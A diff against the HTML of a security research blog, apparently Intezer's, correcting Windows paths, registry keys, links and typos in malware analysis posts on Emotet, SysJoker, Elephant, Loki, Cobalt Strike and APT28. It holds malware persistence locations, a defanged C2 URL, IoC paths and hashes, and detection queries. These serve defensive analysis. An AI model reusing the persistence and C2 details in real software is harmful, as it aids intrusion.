 &lt;h2&gt;Using Sigma to Write Detection Rules for Emotet&lt;span class="hx:absolute hx:-mt-20" id="using-sigma-to-write-detection-rules-for-emotet"&gt;&lt;/span&gt;
 &lt;a href="#using-sigma-to-write-detection-rules-for-emotet" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s take a look at
 &lt;a href="https://analyze.intezer.com/families/db6abbcc-d292-4991-bc90-207c077f5e53"target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
@@ -10489,7 +10514,7 @@ screenshot below shows the malware using the &lt;code&gt;Wait&lt;/code&gt; funct
 seconds before allocating 200 mb of garbage data.&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/04/elephant-malware-targeting-ukrainian-orgs/images/fig3.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;Persistence is established by adding a new key entry with the name &lt;code&gt;Java-3DK&lt;/code&gt;
-to the registry key &lt;code&gt;SoftwareMicrosoftWindowsCurrentVersionRun&lt;/code&gt;. After this,
+to the registry key &lt;code&gt;Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;. After this,
 the malware checks if a new binary exists by comparing its MD5 hash with a hash
 from the server. If no update is needed, it downloads the other two components.&lt;/p&gt;
 &lt;p&gt;The downloader has some 3rd party libraries, whose metadata are listed in the
@@ -10586,7 +10611,7 @@ IP address, hostname, username, etc. In addition to the heartbeat message, the
 malware starts the &amp;ldquo;command&amp;rdquo; loop that checks for new commands to execute every
 3 seconds. If a command is received it executes it by spawning a PowerShell
 instance by executing
-&lt;code&gt;%windir%\SysWOW64\Windows\PowerShell\v1.0\powershell.exe&lt;/code&gt; and returns the
+&lt;code&gt;%windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe&lt;/code&gt; and returns the
 result to the C2 server.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;service Implant {
@@ -10710,8 +10735,8 @@ C7051e88ae43c1bd4b869cf18280ec5e
 40b42005e9cfc5ea2a7cfc1ced975cbb
 Fbe3cb4dfce740c3728c459b853e4249 (email submitted and target Romania)
 Paths
-%HOME%AppDataLocalTempBase-Update.exe
-%HOME%.java-sdk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+%HOME%\AppData\Local\Temp\Base-Update.exe
+%HOME%\.java-sdk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -10748,7 +10773,7 @@ used to deploy another malware at the &amp;ldquo;purchaser&amp;rsquo;s request.&
 is IcedID (BokBot). IcedID was first reported on by
 &lt;a href="https://securityintelligence.com/new-banking-trojan-icedid-discovered-by-ibm-x-force-research/"target="_blank" rel="noopener"&gt;IBM X-Force in November 2017&lt;/a&gt;
 and the malware
-&lt;a href="https://intezer.com/blog/research/icedid-banking-trojan-shares-code-pony-2-0-trojan/"target="_blank" rel="noopener"&gt;shared some code with Pony&lt;/a&gt;.
+&lt;a href="../../../2017/11/icedid-banking-trojan-shares-code-pony-2-0-trojan/"&gt;shared some code with Pony&lt;/a&gt;.
 While initially designed to steal banking credentials, like many other banking
 trojans, the malware has been repurposed for deploying other malware on the
 infected machines.&lt;/p&gt;
@@ -11184,7 +11209,7 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;We wrote one rule that can be easily integrated into two entirely different
-environments and that&amp;rsquo;s the power of Sigma rules. You can run sigmac –list to
+environments and that&amp;rsquo;s the power of Sigma rules. You can run &lt;code&gt;sigmac --list&lt;/code&gt; to
 view the full list of supported targets.&lt;/p&gt;
 &lt;h3&gt;Configuration File&lt;span class="hx:absolute hx:-mt-20" id="configuration-file"&gt;&lt;/span&gt;
 &lt;a href="#configuration-file" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Each environment and organization can use different log sources or index the
@@ -11397,7 +11422,7 @@ of PsExec. PsExec was used for remote execution and lateral movement across
 networks. The credentials were gathered by a credential theft module that was
 able to extract usernames and passwords from the LSASS process.&lt;/p&gt;
 &lt;p&gt;The Russian threat group APT29 (Cozy Bear) has also
-&lt;a href="https://www.welivesecurity.com//srv/htdocs/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"target="_blank" rel="noopener"&gt;used&lt;/a&gt;
+&lt;a href="https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"target="_blank" rel="noopener"&gt;used&lt;/a&gt;
 PsExec to laterally move across networks and deploy their custom backdoor
 FatDuke.&lt;/p&gt;
 &lt;h4&gt;How to Detect&lt;span class="hx:absolute hx:-mt-20" id="how-to-detect"&gt;&lt;/span&gt;
@@ -11681,10 +11706,10 @@ additional payloads, and lateral movement.&lt;/p&gt;
 &lt;p&gt;WMI is often used in VBScript. To connect to a WMI namespace in VBScript, the
 function GetObject can be used with a WMI object path that specifies the
 namespace that holds the desired classes that you wish to use. The most popular
-are located in the rootcimv2 namespace.&lt;/p&gt;
+are located in the &lt;code&gt;root\cimv2&lt;/code&gt; namespace.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;strComputer = &amp;#34;.&amp;#34;
-Set objWMIService = GetObject(&amp;#34;winmgmts:\ &amp;amp; strComputer &amp;amp; &amp;#34;&amp;#34;rootcimv2&amp;#34;&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+Set objWMIService = GetObject(&amp;#34;winmgmts:\\&amp;#34; &amp;amp; strComputer &amp;amp; &amp;#34;\root\cimv2&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -11793,7 +11818,10 @@ malware families. Analyze malware and unknown files for free at
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;This sample is identified as a Loki variant since it shares code genes with other samples from the same malware family, seen in the process tree resulting from the execution of the file in a sandbox.&lt;/p&gt;
 &lt;p&gt;Next, you can view the TTPs with each technique mapped to the MITRE ATT&amp;amp;CK® framework. Also, the IoCs tab provides network information and hashes of the files that were dropped by the malware. All of this information can be downloaded in a CSV format.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/01/save-incident-response-time-intezer-analyze/images/fig3.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2022/01/save-incident-response-time-intezer-analyze/images/fig3.png" title="TTPs with MITRE ATT&amp;amp;CK® framework" alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;TTPs with MITRE ATT&amp;amp;CK® framework&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;Under TTPs, you can see that among the capabilities of this sample are that it collects identification information about the system and has information stealing capabilities. This makes sense considering that the sample shares most of its code with Loki, an information stealing malware. The information presented further supports the classification of the file as Loki.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2022/01/save-incident-response-time-intezer-analyze/images/fig4.png" title="IoCs extracted from the Loki sample can be used to detect similar threats which use the same domains." alt="" loading="lazy" /&gt;
@@ -12244,7 +12272,7 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;p&gt;Finally on Windows we can query the registry table for keys similar to the registry key in the report:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;registry&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;LIKE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;igfxCUIService&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;registry&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;key&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;LIKE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;igfxCUIService&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -12401,7 +12429,7 @@ uploaded to VirusTotal as &lt;code&gt;style-loader.ts&lt;/code&gt; and has only 
 time of this writing.&lt;/p&gt;
 &lt;p&gt;The Dropper drops a zipped SysJoker (&lt;code&gt;53f1bb23f670d331c9041748e7e8e396&lt;/code&gt;) from
 C2 &lt;code&gt;https[://]github[.]url-mini[.]com/msg.zip&lt;/code&gt;, copies it to
-&lt;code&gt;C:\ProgramData\Recovery\Systemrecovery\Windows.zip&lt;/code&gt;, unzips it and executes
+&lt;code&gt;C:\ProgramData\RecoverySystem\recoveryWindows.zip&lt;/code&gt;, unzips it and executes
 it. All of these actions are executed via PowerShell commands.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2022/01/new-backdoor-sysjoker/images/fig2.png" title="Process tree showing PowerShell commands." alt="" loading="lazy" /&gt;
@@ -12460,6 +12488,7 @@ hardcoded Google Drive link.&lt;/p&gt;
 &lt;img src="https://research.intezer.com/blog/2022/01/new-backdoor-sysjoker/images/fig6.png" title="Decoding with CyberChef." alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;Decoding with CyberChef.&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Decoded with &lt;a href="https://gchq.github.io/CyberChef/"target="_blank" rel="noopener"&gt;CyberChef&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;The Google Drive link hosts a text file named domain.txt that holds an encoded
 C2. The text file&amp;rsquo;s content changes over time, depending on the current
 available C2. SysJoker will decode the C2 and send the collected user&amp;rsquo;s
@@ -12469,7 +12498,7 @@ when the malware communicates with the C2.&lt;/p&gt;
 &lt;h3&gt;C2 Instructions&lt;span class="hx:absolute hx:-mt-20" id="c2-instructions"&gt;&lt;/span&gt;
 &lt;a href="#c2-instructions" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;SysJoker runs a while(1) loop that sends a request to the C2&amp;rsquo;s /api/req
 directory with the unique token and will process the C2&amp;rsquo;s response which is
-built as JSON using functions from this library. This is how SysJoker pings the
+built as JSON using functions from &lt;a href="https://github.com/nlohmann/json"target="_blank" rel="noopener"&gt;this library&lt;/a&gt;. This is how SysJoker pings the
 C2 for instructions (see step 2 in the image below):&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/01/new-backdoor-sysjoker/images/fig7.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;If the server responds with data, SysJoker will parse the received payload (see
@@ -12517,6 +12546,7 @@ will provide you with visibility into the type and origin of all binary code
 that resides in your machine&amp;rsquo;s memory. The figure below shows an example of
 an endpoint infected with SysJoker:&lt;/li&gt;
 &lt;/ul&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/01/new-backdoor-sysjoker/images/fig12.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;Use detection content to search in your EDR or SIEM. We provided you with IoCs
 and a rich list of detection content for each operating system below. Use these
 with your EDR to hunt for infected machines. We will publish a dedicated blog
@@ -12536,7 +12566,7 @@ with SysJoker, in the course of this investigation, check:
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;SysJoker&amp;rsquo;s Linux and Windows versions are now indexed in Intezer Analyze.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/01/new-backdoor-sysjoker/images/fig12.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2022/01/new-backdoor-sysjoker/images/fig13.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h2&gt;Final Points&lt;span class="hx:absolute hx:-mt-20" id="final-points"&gt;&lt;/span&gt;
 &lt;a href="#final-points" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;There are indications that SysJoker attack is performed by an advanced threat
 actor:&lt;/p&gt;
@@ -12639,7 +12669,7 @@ C:\ProgramData\SystemData\tempi2.txt
 C:\ProgramData\SystemData\temps1.txt
 C:\ProgramData\SystemData\temps2.txt
 C:\ProgramData\SystemData\tempu.txt
-C:\ProgramData\SystemData\microsoft_Windows.dll
+C:\ProgramData\SystemData\microsoft_windows.dll
 C:\ProgramData\xAE Operating System\ServiceHub.exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
@@ -12787,9 +12817,9 @@ data-copied-label="Copied!"
 &lt;code&gt;/Library/LaunchAgents/com.apple.update.plist&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Content:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;#34;1.0″ encoding=&amp;#34;UTF-8″?&amp;gt;&lt;/span&gt;
+&lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;plist&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;1.0″&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;plist&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;&amp;lt;dict&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;lt;key&amp;gt;&lt;/span&gt;Label&lt;span class="nt"&gt;&amp;lt;/key&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nt"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;com.apple.update&lt;span class="nt"&gt;&amp;lt;/string&amp;gt;&lt;/span&gt;
@@ -14060,7 +14090,7 @@ connections, consider using environment variables instead.&lt;/p&gt;
 access to unauthorized functionality and data. If you don&amp;rsquo;t believe us, check
 out our research about misconfigurations in another popular workflow platform
 called
-&lt;a href="https://intezer.com/blog/container-security/new-attacks-on-kubernetes-via-misconfigured-argo-workflows/"target="_blank" rel="noopener"&gt;Argo Workflows&lt;/a&gt;.&lt;/p&gt;
+&lt;a href="../../../2021/07/new-attacks-on-kubernetes-via-misconfigured-argo-workflows/"&gt;Argo Workflows&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;In the event that an attacker has already exploited a misconfiguration or
 vulnerability, you will need to detect and terminate the malicious or
 unauthorized code in your production environment as soon as it is executed.&lt;/p&gt;
@@ -14131,7 +14161,7 @@ code with Mimikatz.&lt;/p&gt;
 &lt;p&gt;If we look at the related TeleBots samples, we can see (Figure 3) that they
 share code with a sample labeled XData. XData was a ransomware that targeted
 Ukraine a month before the
-&lt;a href="../../../2021/09/notpetya-returns-bad-rabbit/"&gt;NotPetya&lt;/a&gt; incident. According
+&lt;a href="../../../2017/10/notpetya-returns-bad-rabbit/"&gt;NotPetya&lt;/a&gt; incident. According
 to an ESET
 &lt;a href="https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/"target="_blank" rel="noopener"&gt;report&lt;/a&gt;,
 the malware was launched just after M.E.Doc had been executed on the machine,
@@ -14726,7 +14756,7 @@ into capabilities specific to the injected Cobalt Strike process.&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/blog/2021/08/cobalt-strike-detect-this-persistent-threat/images/fig10.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;The &amp;ldquo;IoCs&amp;rdquo; tab in Intezer Analyze shows indicators that can help you pivot and
 search in your environment during investigations to map out the scope of an
-attack. IoCs provides you with file hashes and network indicators such as URLs,
+attack. IoCs provide you with file hashes and network indicators such as URLs,
 and IP addresses being contacted through irregular ports.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2021/08/cobalt-strike-detect-this-persistent-threat/images/fig11.png" title="IoCs tab showing file and network indicators." alt="" loading="lazy" /&gt;
@@ -14885,7 +14915,7 @@ infrastructure. In the event of an incident, the investigators would have to
 collaborate with all of the entities in this chain of dependencies, each with
 their own incident response approaches and methods. Once again, this
 prolongates the
-&lt;a href="https://intezer.com/blog/malware-analysis/save-incident-response-time-intezer-analyze/"target="_blank" rel="noopener"&gt;incident response time&lt;/a&gt;.&lt;/p&gt;
+&lt;a href="../../../2022/01/save-incident-response-time-intezer-analyze/"&gt;incident response time&lt;/a&gt;.&lt;/p&gt;
 &lt;h3&gt;Service-Level Agreement (SLA)&lt;span class="hx:absolute hx:-mt-20" id="service-level-agreement-sla"&gt;&lt;/span&gt;
 &lt;a href="#service-level-agreement-sla" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When it comes to SLAs, important terms related to forensics are often missing.
 This is due to both the failure of CSPs to provide full transparency in this
@@ -15101,7 +15131,7 @@ the most popular repositories on
 and over 3,000 contributors. Each year there is a steady increase in
 enterprises using Kubernetes and the number of clusters they deploy. According
 to the Cloud Native Computing Foundation (CNCF)
-&lt;a href="https://www.cncf.io//srv/htdocs/wp-content/uploads/2020/11/CNCF_Survey_Report_2020.pdf"target="_blank" rel="noopener"&gt;2020 survey&lt;/a&gt;,
+&lt;a href="https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Survey_Report_2020.pdf"target="_blank" rel="noopener"&gt;2020 survey&lt;/a&gt;,
 91% of respondents are using Kubernetes, compared to 78% in 2019 and 58% in
 2018. In the same survey, it was reported that among the top challenges of
 using and deploying containers were complexity, security and lack of training.&lt;/p&gt;
@@ -15381,13 +15411,13 @@ regions gives us reason to believe that Russia is behind the attack.&lt;/p&gt;
 &lt;li&gt;Victimology: APT28 has targeted Ukraine and Georgia in the past. &lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;[1]&lt;/a&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;[2]&lt;/a&gt;&lt;a href="https://securelist.com/greyenergys-overlap-with-zebrocy/89506/"target="_blank" rel="noopener"&gt;[3]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Phishing theme: APT28 previously used COVID-19-related phishing themes to
 target countries including Ukraine. APT28 also used NATO as a phishing theme
-in the past. &lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;[1]&lt;/a&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;[2]&lt;/a&gt;&lt;a href="https://intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"target="_blank" rel="noopener"&gt;[4]&lt;/a&gt;&lt;a href="https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/"target="_blank" rel="noopener"&gt;[5]&lt;/a&gt;&lt;/li&gt;
+in the past. &lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;[1]&lt;/a&gt;&lt;a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf"target="_blank" rel="noopener"&gt;[2]&lt;/a&gt;&lt;a href="../../../2020/12/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"&gt;[4]&lt;/a&gt;&lt;a href="https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/"target="_blank" rel="noopener"&gt;[5]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Use of AutoIt: One of Zebrocy&amp;rsquo;s (malware from APT28) variants is written in
 AutoIt. &lt;a href="https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/"target="_blank" rel="noopener"&gt;[6]&lt;/a&gt;&lt;a href="https://vk-intel.org/2019/01/22/lets-learn-progression-of-apt28-autoit-zebrocy-downloaders-source-code-level-analysis/"target="_blank" rel="noopener"&gt;[7]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;File search with predefined extensions: Zebrocy searches for predefined file
 extensions on the victim machine. &lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;a href="https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/"target="_blank" rel="noopener"&gt;[9]&lt;/a&gt;&lt;a href="https://attack.mitre.org/software/S0251/"target="_blank" rel="noopener"&gt;[13]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Compressed file holding both malicious and benign files was used in an APT28
-COVID-19 phishing attack last year and in other campaigns in the past. &lt;a href="https://intezer.com/blog/research/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"target="_blank" rel="noopener"&gt;[4]&lt;/a&gt;&lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;/li&gt;
+COVID-19 phishing attack last year and in other campaigns in the past. &lt;a href="../../../2020/12/russian-apt-uses-covid-19-lures-to-deliver-zebrocy/"&gt;[4]&lt;/a&gt;&lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Use of spear phishing emails containing URL-shortener was documented in past
 APT28 campaigns. In one of the campaigns, this URL hosted a ZIP file
 containing a benign PDF and a malicious executable. &lt;a href="https://www.welivesecurity.com/2019/05/22/journey-zebrocy-land/"target="_blank" rel="noopener"&gt;[8]&lt;/a&gt;&lt;a href="https://www.justice.gov/opa/page/file/1098481/download"target="_blank" rel="noopener"&gt;[10]&lt;/a&gt;&lt;a href="https://www.justice.gov/file/1080281/download"target="_blank" rel="noopener"&gt;[11]&lt;/a&gt;&lt;/li&gt;
@@ -15556,7 +15586,7 @@ for analyzing memory dumps.&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.cnbc.com/2014/10/28/russian-hackers-target-nato-military-secrets.html"target="_blank" rel="noopener"&gt;CNBC, Russian Hackers Target NATO, Military Secrets&lt;/a&gt;&lt;/li&gt;
